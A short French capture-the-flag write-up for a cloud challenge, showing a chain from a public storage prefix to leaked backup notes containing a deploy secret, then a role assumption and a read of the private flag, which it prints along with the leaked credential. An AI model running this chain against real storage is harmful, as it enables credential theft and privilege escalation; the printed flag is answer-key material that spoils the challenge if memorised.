# backup-prefix

## Challenge
**Catégorie :** cloud  **Auteur :** hibris / Clawd  **Instance :** par équipe, HTTP
> `backup-prefix` — Préfixe public → credential fuité → escalade de rôle.
> Flag sur le filesystem, served by no route.

## Résolution
Même chaîne que la série (cf. [registry-prefix](registry-prefix.md)) :
```
/list?prefix=public/        → public/readme.txt, public/backup-notes.txt
/get public/backup-notes.txt→ deploy_secret=AKIAa8b371afeeaf263fa1d6
/assume?secret=…            → role--JdPq1Szb8Irj43hf9PDVn3-hfVINhI_ (backup-restore)
/get private/flag (X-Role-Token) → NCTF{5769dc71092bebf2073169ee}
```
`python3 -I solve_prefix.py <url>`.

## Flag
`NCTF{5769dc71092bebf2073169ee}`
